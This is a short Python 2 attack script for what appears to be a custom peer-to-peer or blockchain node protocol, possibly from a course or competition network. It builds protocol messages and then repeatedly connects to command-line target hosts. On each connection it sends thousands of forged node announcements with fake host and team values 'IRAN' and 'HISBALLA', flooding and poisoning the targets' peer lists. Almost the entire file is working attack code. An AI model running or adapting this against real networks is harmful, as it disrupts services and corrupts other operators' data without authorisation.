from sys import argv
from itertools import izip
from time import time
import socket
import struct

START_NODES = struct.pack(">I", 0xbeefbeef)  # {Instead of unpacking and comparing to the number every time we
START_BLOCKS = struct.pack(">I", 0xdeaddead)  # {will compare the raw string to the packed number.


class Node(object):
	def __init__(self, host, port, name, ts):
		self.host = host
		self.port = port
		self.team = name
		self.ts = ts

	def __eq__(self, other):
		return self.__dict__ == other.__dict__

	def __repr__(self):
		return repr(self.__dict__)

	def __getitem__(self, index):
		return (self.host, self.port, self.team, self.ts)[index]


def createMsg(cmd, node_dict, block_list):
	parsed_cmd = struct.pack(">I", cmd)
	nodes_count = struct.pack(">I", len(node_dict))

	parsed_nodes = ''
	for node in node_dict:
		parsed_nodes += struct.pack("B", len(node.team)) + node.team + struct.pack("B", len(node.host)) + node.host + struct.pack(">H", node.port) + struct.pack(">I", node.ts)

	block_count = struct.pack(">I", len(block_list))
	parsed_blocks = ''
	for block in block_list:
		parsed_blocks += block

	return parsed_cmd + START_NODES + nodes_count + parsed_nodes + START_BLOCKS + block_count + parsed_blocks


target_ip = argv[1].split(',')
target_port = map(int, argv[2].split(','))

for port_num in xrange(6666):
	for tup in izip(target_ip, target_port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(tup)
		out_msg = createMsg(1,[Node("IRAN", port_num, "HISBALLA", int(time()))] , [])

		try:
			sock.sendall(out_msg)
		except Exception as err: print err
